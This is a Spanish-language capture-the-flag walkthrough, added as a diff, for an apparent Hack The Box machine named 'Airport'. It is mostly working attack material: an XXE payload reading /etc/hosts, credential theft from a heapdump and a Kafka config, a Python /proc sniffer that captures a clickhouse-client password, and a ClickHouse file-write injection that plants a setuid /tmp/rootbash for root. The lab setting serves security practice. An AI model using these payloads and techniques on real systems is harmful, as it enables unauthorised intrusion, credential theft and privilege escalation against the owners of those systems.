@@ -1,0 +1,113 @@
+* explora la web de mierda.
+* encontraras http://db.htb-airport.htb/ http://api.htb-airport.htb/ y la mas importante http://api.htb-airport.htb/actuator/heapdump 
+* con el archivo encotrado y JDumpSpider-1.1-SNAPSHOT-full.jar extraeras las contraseñas
+* usa las contraseñas para entrar a http://api.htb-airport.htb/play
+* crea un archivo evil.xml con un XXE 
+
++++++++ evil.xml +++++++
+
+<?xml version="1.0"?>
+<!DOCTYPE ns0:IATA_AIDX_FlightLegNotifRQ [
+<!ENTITY test SYSTEM 'file:///etc/hosts'>
+]>
+<ns0:IATA_AIDX_FlightLegNotifRQ xmlns:ns0="http://www.iata.org/IATA/2007/00"
+    Version="22.1" TimeStamp="2026-08-20T05:47:00Z"
+    TransactionIdentifier="tx-3001" TransactionStatusCode="Delete">
+  <ns0:Originator CompanyShortName="DLH" TravelSector="A" Code="LH" CodeContext="3"/>
+  <ns0:FlightLeg>
+    <ns0:LegIdentifier>
+      <ns0:Airline CodeContext="3">LH</ns0:Airline>
+      <ns0:FlightNumber>&test;</ns0:FlightNumber>
+      <ns0:DepartureAirport CodeContext="3">FRA</ns0:DepartureAirport>
+      <ns0:ArrivalAirport CodeContext="3">MUC</ns0:ArrivalAirport>
+      <ns0:OriginDate>2026-08-20</ns0:OriginDate>
+      <ns0:RepeatNumber CurrentInd="true">1</ns0:RepeatNumber>
+    </ns0:LegIdentifier>
+  </ns0:FlightLeg>
+</ns0:IATA_AIDX_FlightLegNotifRQ>
+
++++++++++ EOF ++++++
+
+* manda este archivo a la siguiente ruta
+  curl http://api.htb-airport.htb:8081/feeds/aidx -d @evil.xml
+
+* en el navegador en http://db.htb-airport.htb/play haz la siguiente consulta y revisa si pudiste leer /etc/hosts
+
+  SELECT * FROM flightleg_json_mv order by ingested desc limit 1;
+
+* el archivo que nos interesa es el de kafka analiza y roba las creds
+  /opt/kafka_2.13-4.3.1/config/server.properties
+
+
+* Investiga dentro. la chingadera no tiene root floag. asi que tienes que saltar usando clickhouse-client
+
+* crea un sniffer de python
+
+++++ snifer.py ++++
+
+import os, re
+
+pw_pattern = re.compile(rb'--password\x00([^\x00]+)')
+
+
+while True:
+    for pid in os.listdir('/proc'):
+        if not pid.isdigit():
+            continue
+        try:
+            # Read raw bytes — avoids any string decoding overhead
+            data = open(f'/proc/{pid}/cmdline', 'rb').read()
+            if b'clickhouse-client' in data and b'--password' in data:
+                m = pw_pattern.search(data)
+                if m:
+                    pw = m.group(1).decode()
+                    print(f'[+] PASSWORD: {pw}')
+                    open('/tmp/ch_pass.txt', 'w').write(pw)
+                    exit(0)
+        except:
+            pass
+
+
+++++ EOF ++++
+
+* crea un sniffer-runner.sh en la misma carpeta
+
+
+++++ sniffer-runner.sh ++++
+# Start 5 sniffers in background
+for i in 1 2 3 4 5; do
+    /opt/aidx-pipeline/venv/bin/python3 -c "$(cat sniffer.py)" &
+done
+
+# Produce the DLQ message
+/opt/aidx-pipeline/venv/bin/python3 -c "
+from confluent_kafka import Producer
+p = Producer({'bootstrap.servers': 'localhost:9092'})
+p.produce('aidx.flightleg.dlq.v1', value=b'<t>go</t>', headers=[(b'reason',b'test')])
+p.flush(10)
+"
+
+# Wait for the timer (fires every 2 minutes)
+# When it fires: [+] PASSWORD: [CAPTURED]
+
+++++ EOF ++++
+
+* esto te va a entregar una contraseña 
+
+* busca y utiliza clickhouse-client --user default --password [captured-PWD]
+
+* dentro del cliente añade al aidx_quarantine.py el codigo para generar una rootbash en tmp
+
+INSERT INTO FUNCTION file('aidx_quarantine.py', 'LineAsString')
+SELECT '#!/usr/bin/env python3'
+UNION ALL SELECT 'import os'
+UNION ALL SELECT 'os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")'
+UNION ALL SELECT 'print("1\\t2\\t3")'
+
+* vuelve a lanzar una peticion con y espera unos 2 min 
+  curl http://api.htb-airport.htb:8081/feeds/aidx -d @evil.xml
+
+* esto de generara una bash con bitsuid. ejecutala con 
+  /tmp/rootbash -p 
+
+* con esto ya puedes leer todas las flags
